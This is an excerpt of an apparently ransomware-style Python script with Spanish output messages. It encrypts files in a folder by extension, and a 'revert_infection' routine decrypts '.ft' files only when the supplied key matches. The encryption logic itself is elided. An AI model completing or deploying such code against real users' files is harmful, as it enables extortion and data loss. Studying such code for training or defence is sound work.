    ...
    try:    
          for filename in os.listdir(folder_path):
            ...
            if extension in extensions:
                ...
                if not args.silent:
                    print(f'\033[33m{filename}\033[0m cifrado como \033[33m{new_filename}\033[0m')
    except (PermissionError, FileNotFoundError):
        print('\033[31m' + 'No tiene permisos en esta carpeta, o no existente en el perfil de usuario que esta ejecutando el script\n' + '\033[0m')
    ...
    try:
        for filename in os.listdir(folder_path):
            ...
            if extension == '.ft':
                ...
                os.remove(os.path.join(folder_path, filename))
                if not args.silent:
                        print('\033[32m' + f'{filename} desencriptado como {new_filename}' + '\033[0m')
    except (PermissionError, FileNotFoundError):
        print('\033[31m' + 'No tiene permisos en esta carpeta, o no existente en el perfil de usuario que esta ejecutando el script\n' + '\033[0m')

# Ejecuta el programa
if args.reverse:
    key_texto = key.decode('utf-8')
    if args.reverse != key_texto:
        print("La clave introducida no es correcta")
        exit()
    else:
        revert_infection()
